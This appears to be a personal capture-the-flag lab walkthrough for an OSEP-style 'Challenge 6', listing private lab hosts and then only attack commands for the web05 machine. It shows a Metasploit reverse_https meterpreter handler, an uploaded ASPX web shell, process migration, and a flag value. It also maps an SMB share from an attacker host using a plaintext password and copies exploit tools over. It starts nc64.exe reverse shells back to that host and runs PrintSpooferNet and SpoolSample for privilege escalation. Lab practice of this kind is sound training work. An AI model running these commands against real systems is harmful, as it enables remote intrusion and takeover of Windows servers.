# Challenge 6

## Hosts

### External

192.168.100.181

192.168.100.189

### Internal

172.16.100.180

172.16.100.188

172.16.100.187

172.16.100.184

172.16.100.183

172.16.100.192

172.16.100.194

172.16.100.197

## web05

{% code overflow="wrap" %}
```powershell
# Craft Malicious ASPX shell
# Meterpreter
use exploit/multi/handler
set lport 443
set payload windows/x64/meterpreter/reverse_https
run
# Upload shell at
http://192.168.100.181/
# Navigate to shell to activate it
192.168.100.181/met.aspx

# Open a shell
shell
# Start notepad as a process to migrate into
notepad
# Exit shell
exit
# Migrate into notepad process
ps
migrate 1088
shell
# Get flag
cd inetpub
type local.txt
e1f242b2cebc0c6cb79193288d703462
# Create network share and copy across needed files
cd \windows\tasks
net use x: \\192.168.49.100\visualstudio /user:kali @WSX2wsx
copy X:\OSEP\ActiveDirectoryExploitation\SpoolSample.exe
copy X:\OSEP\PrintSpooferNet\PrintSpooferNet\bin\x64\Release\PrintSpooferNet.exe
copy X:\OSEP\ActiveDirectoryExploitation\nc64.exe
copy X:\OSEP\ActiveDirectoryExploitation\run.exe
copy X:\OSEP\ActiveDirectoryExploitation\run2.exe
copy X:\OSEP\ActiveDirectoryExploitation\run3.exe
# Start additional shells to carry out the PrintSpoolerNet attack
start /b nc64.exe -e cmd.exe 192.168.49.100 4445
start /b nc64.exe -e cmd.exe 192.168.49.100 4446
# Exit main meterpreter shell and restart listener
exit
exit
run
# Creating the pipe server as Network Service account
PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss
# Invoke SpoolSample with forward slash
SpoolSample.exe web05 web05/pipe/test
```
{% endcode %}

